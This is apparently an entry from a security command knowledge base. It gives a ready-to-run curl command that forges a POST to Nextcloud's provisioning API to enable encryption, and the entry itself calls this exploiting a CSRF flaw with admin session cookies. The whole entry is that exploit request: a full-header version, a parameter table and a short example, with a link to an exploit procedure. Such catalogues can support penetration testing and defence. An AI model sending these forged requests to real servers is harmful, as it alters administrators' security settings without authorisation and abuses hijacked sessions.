---
data: >-
  curl -i -s -k -X $'POST' -H $'Host: <nextcloud_server>' -H $'Proxy-Connection:
  keep-alive' -H $'Content-Length: 9' -H $'Accept: _/_' -H $'Content-Type:
  application/x-www-form-urlencoded; charset=UTF-8' -H $'OCS-APIREQUEST: true'
  -H $'Origin: http://<nextcloud_server>' -H $'User-Agent: Mozilla/5.0 (Windows
  NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96
  Safari/537.36' -H $'X-Requested-With: XMLHttpRequest' -H $'requesttoken:
  sSxMouPIwzbpI5ErZycXzGqCsOzacYntRk18kUOwin4=:gBUhzYWys3qhEqNPFE1frx663pq9BdjaKiwz5zfo6y4='
  -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9 ' -H
  $'Cookie: <cookies>' --data-binary $'value=yes\x0d\x0a'
  $'http://<nextcloud_server>/ocs/v2.php/apps/provisioning_api/api/v1/config/apps/core/encryption_enabled'
tags:
  - csrf
  - nextcloud
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:49.412Z'
id: e268c903-9c26-4891-b35c-dd29b9884ed0
verified: false
validated: true
submitted: true
---
# curl-enable-nextcloud-encryption

## Command

```bash
curl -i -s -k -X $'POST' -H $'Host: <nextcloud_server>' -H $'Proxy-Connection: keep-alive' -H $'Content-Length: 9' -H $'Accept: _/_' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'OCS-APIREQUEST: true' -H $'Origin: http://<nextcloud_server>' -H $'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36' -H $'X-Requested-With: XMLHttpRequest' -H $'requesttoken: sSxMouPIwzbpI5ErZycXzGqCsOzacYntRk18kUOwin4=:gBUhzYWys3qhEqNPFE1frx663pq9BdjaKiwz5zfo6y4=' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9 ' -H $'Cookie: <cookies>' --data-binary $'value=yes\x0d\x0a' $'http://<nextcloud_server>/ocs/v2.php/apps/provisioning_api/api/v1/config/apps/core/encryption_enabled'
```

## Description

This curl command forges a POST request to enable Nextcloud's encryption setting, exploiting the CSRF vulnerability with admin cookies.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `<nextcloud_server>` | Target server address | Yes |
| `<cookies>` | Admin session cookies | Yes |
| `requesttoken` | Token for the request | Yes |
| `Content-Length: 9` | Length for 'value=yes\r\n' | Yes |
| `--data-binary $'value=yes\x0d\x0a'` | Payload to enable encryption | Yes |

## Examples

### Basic Usage

```bash
curl -i -s -k -X POST -H 'Host: example.com' -H 'Cookie: nc_session=abc123' --data-binary $'value=yes\r\n' 'http://example.com/ocs/v2.php/apps/provisioning_api/api/v1/config/apps/core/encryption_enabled'
```

### Advanced Usage

Use full headers for browser-like simulation.

## Expected Output

HTTP 200 OK with success XML, similar to disable command.

## Related

- [[commands/curl-disable-nextcloud-encryption]]
- [[procedures/Exploit-CSRF-to-Enable-Nextcloud-Encryption]]
